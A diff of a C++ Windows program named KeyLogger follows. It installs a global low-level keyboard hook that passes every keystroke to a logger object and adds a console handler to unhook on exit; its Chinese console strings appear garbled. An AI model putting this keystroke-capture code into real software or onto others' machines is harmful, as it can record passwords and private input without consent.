@@ -7,24 +7,37 @@
 #include <iostream>
 
 using namespace std;
-KeyLogger& keyLogger = KeyLogger::GetInstance();
+KeyLogger* keyLogger = nullptr;
+HHOOK keyboardHook = HHOOK{};
 
 LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam)
 {
 	KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT*)lParam;
 	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
-		keyLogger.OnKeyDown(ks->vkCode);
+		keyLogger->OnKeyDown(ks->vkCode);
 	} else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
-		keyLogger.OnKeyUp(ks->vkCode);
+		keyLogger->OnKeyUp(ks->vkCode);
 	}
 	return CallNextHookEx(0, code, wParam, lParam);
 }
 
+BOOL WINAPI ConsoleHandlerRoutine(DWORD dwCtrlType)
+{
+	if (dwCtrlType == CTRL_CLOSE_EVENT){
+		delete keyLogger;
+		UnhookWindowsHookEx(keyboardHook);
+		cout << "½â³ýHook,³ÌÐò¼´½«ÍË³ö" << endl;
+	}
+
+	return FALSE;
+}
+
 int main()
 {
-	HHOOK keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, GetModuleHandleA(0), 0);
-	if (keyboardHook == 0)
-	{
+	keyLogger = KeyLogger::GetInstance();
+	SetConsoleCtrlHandler(ConsoleHandlerRoutine, TRUE);
+	keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, GetModuleHandleA(0), 0);
+	if (keyboardHook == 0){
 		cout << "Hook¼üÅÌÊ§°Ü" << endl;
 		return -1;
 	}
